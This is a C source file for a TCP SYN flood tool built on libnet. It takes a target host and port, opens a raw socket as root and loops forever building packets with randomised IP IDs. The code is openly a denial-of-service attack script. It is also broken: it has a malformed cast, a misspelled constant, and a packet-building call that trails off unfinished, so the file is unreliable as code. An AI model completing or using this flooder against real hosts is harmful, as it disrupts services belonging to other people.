#include <sys/socket.h>
#include <arpa/inet.h>
#include <libnet.h>
 
#define FLOOD_DELAY 5000 /* Delay between packet inject by 5000ms */

/* Returns an IP in x.x.x.x notation */
char *print_ip(u_long *ip_addr_ptr){
    return inet_ntoa(* ((struct in_addr *p)) ip_addr_ptr);
}

int main(int argc, char *argv[]){
    u_long dest_ip;
    u_short dest_port;
    u_char errbuf[LIBNET_ERRBUF_SIZE], *packet;
    int opt, network, byte_count, packet_size = LIBNET_IP_H + LIB_NET_TCP_H;

    if(argc < 3){
        printf("Usage: \n%s\t <target host> <target port>\n", argv[0]);
        exit(1);
    }

    dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); /* The Host */
    dest_port = (u_short) atoi(argv[2]); /* The Port */

    network = libnet_open_raw_sock(IPPROTO_RAW); /* Open Network interface */
    if(network == -1)
        libnet_error(LIBNET_ERR_FATAL, "can't open network interface. -- this program must run as root.\n");

    libnet_seed_prand(); /* Seeding the random number generator */

    printf("SYN Flooding port %d of %s...\n", dest_port, print_ip(&dest_ip));
    while(1){ /* Loop Forever until break */
        libnet_build_ip(LIBNET_TCP_H,       // Size of the packet san IP Header
            IPTOS_LOWDELAY,                 // IP tos
            libnet_get_prand(LIBNET_PRu16), // IP ID (randomised)
            0,                              // Frag Stuff
        
        
        
        
        
        
        )

    }

}